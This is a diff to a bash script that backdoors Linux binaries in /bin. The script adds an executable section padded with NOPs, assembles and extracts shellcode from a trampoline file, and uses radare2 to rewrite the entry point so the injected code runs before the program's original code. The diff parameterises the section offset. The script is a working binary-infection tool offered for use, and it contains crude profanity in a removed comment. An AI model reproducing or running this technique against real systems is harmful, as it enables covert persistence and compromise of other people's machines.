@@ -1,48 +1,53 @@
 #!/bin/bash
-echo "What Binary you want backdoor?"
+
+# Setup params
+echo "What Binary you want backdoor in /bin?"
+bin=id
 read bin
-rm injected_$bin
+
+
+#Parse section address
+readelf -S /bin/$bin  | grep "\[" | cut -d] -f 2 | sed "s/ \+/ /g" | cut -d\  -f 4,5 | sed -n '3,$'p | sed 's/ 0/ 0x/g' | sed 's/^0/0x/g'
+echo "Section Offset? format: 0xbeef"
+SectionOffset=0x6d59
+
+read SectionOffset
+#rm injected_$bin
 cp /bin/$bin .
 mv ./$bin injected_$bin
+
+# Compute Section offset in little endian
+LittleEndianSecOffset=$(python -c "from textwrap import wrap  as w ; print  ''.join(w('$SectionOffset'[2:],2)[::-1]) ")
+echo "LESO=$LittleEndianSecOffset"
 
 # Generate 100bytes of nops
 seq 100 | xargs -i bash -c 'echo -ne "\\x90" >> nopsection' 
 
 # Add section and make it rwx
 objcopy --add-section .backdoor=nopsection --set-section-flags .backdoor=alloc,load,code injected_$bin 
-objcopy --adjust-section-vma .backdoor=0xbeef injected_$bin
-rm nopsection
-#https://reverseengineering.stackexchange.com/questions/14779/how-to-successfully-add-a-code-section-to-an-executable-file-in-linux
-
+objcopy --adjust-section-vma .backdoor=$SectionOffset injected_$bin
+#rm nopsection
 
 # Storing original entrypoint
 ENTRYPOINT=$(readelf -a injected_$bin | grep Entry | cut -d : -f 2 | sed 's/^\s\+//g')
-
 echo "Original entry=$ENTRYPOINT"
-
 
 # Generating payload
 sed  "s/.*;ENTRY/  jmp $ENTRYPOINT  ;ENTRY/g" -i Trampoline.asm
 nasm Trampoline.asm -o Trampoline.o -f elf64
-ld Trampoline.o -o Trampoline
-#shellcode=$(objdump -d Trampoline|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s ) SHITY EXTRACTOR WASTED MY TIME FUCK YOU 
-shellcode=$(for i in $(objdump -d Trampoline |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo)
 
+# Extracting the shellcode
+shellcode=$(for i in $(objdump -d Trampoline.o |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo)
 echo -ne $shellcode > shellcode
 
-
-
-## Calculating offset to write jmp to entry
-#size of shellcode
+# Calculating offset to write jmp to entry
 sc_size=$(wc -c shellcode| cut -d\  -f 1)
 
 echo "size of shellcode :$sc_size bytes"
 
-#offset to write jmp entry
-offset=`python -c "print hex(int($sc_size) + 0xbeef)"` 
+# offset to write jmp entry
+offset=`python -c "print hex(int($sc_size) + $SectionOffset)"` 
 echo "jmp entry offset=$offset"
 
-
 # Changing Entry and injecting payload
-r2 -c "0x18; oo+;wx efbe;0xbeef;wff ./shellcode; $offset;\"wa jmp $ENTRYPOINT \"; 0xbeef; pd 20" injected_$bin
-#r2 -c "0x18; oo+;wx efbe;0xbeef; \"wa nop;nop;nop;push rax; push rbx; pop rbx; pop rax; jmp $ENTRYPOINT\"" injected_ls
+r2 -c "0x18; oo+;wx $LittleEndianSecOffset;$SectionOffset;wff ./shellcode; $offset;\"wa jmp $ENTRYPOINT \"; $SectionOffset; pd 20" injected_$bin
